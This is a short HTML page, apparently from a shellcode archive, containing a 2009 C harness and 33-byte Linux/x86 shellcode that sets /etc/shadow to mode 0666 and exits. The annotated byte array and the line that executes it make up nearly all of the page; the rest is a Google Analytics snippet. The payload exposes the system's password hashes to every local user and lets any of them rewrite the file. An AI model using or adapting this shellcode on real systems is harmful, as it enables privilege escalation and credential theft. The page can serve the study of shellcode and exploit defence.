<html><head><title>Linux/x86 - chmod(/etc/shadow, 0666) &amp; exit() - 33 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
 
/*
    linux/x86 ; chmod(/etc/shadow, 0666) &amp; exit() 33 bytes
    written by ka0x - &lt;ka0x01[alt+64]gmail.com&gt;
    lun sep 21 17:13:25 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek and others!
 
*/
 
int main()
{
 
    char shellcode[] =
            &quot;\x31\xc0&quot;          // xor eax,eax
            &quot;\x50&quot;              // push eax
            &quot;\x68\x61\x64\x6f\x77&quot;      // push dword 0x776f6461
            &quot;\x68\x2f\x2f\x73\x68&quot;      // push dword 0x68732f2f
            &quot;\x68\x2f\x65\x74\x63&quot;      // push dword 0x6374652f
            &quot;\x89\xe3&quot;          // mov ebx,esp
            &quot;\x66\x68\xb6\x01&quot;      // push word 0x1b6
            &quot;\x59&quot;              // pop ecx
            &quot;\xb0\x0f&quot;          // mov al,0xf
            &quot;\xcd\x80&quot;          // int 0x80
            &quot;\xb0\x01&quot;          // mov al,0x1
            &quot;\xcd\x80&quot;;         // int 0x80
 
    printf(&quot;[*] ShellCode size (bytes): %d\n\n&quot;, sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
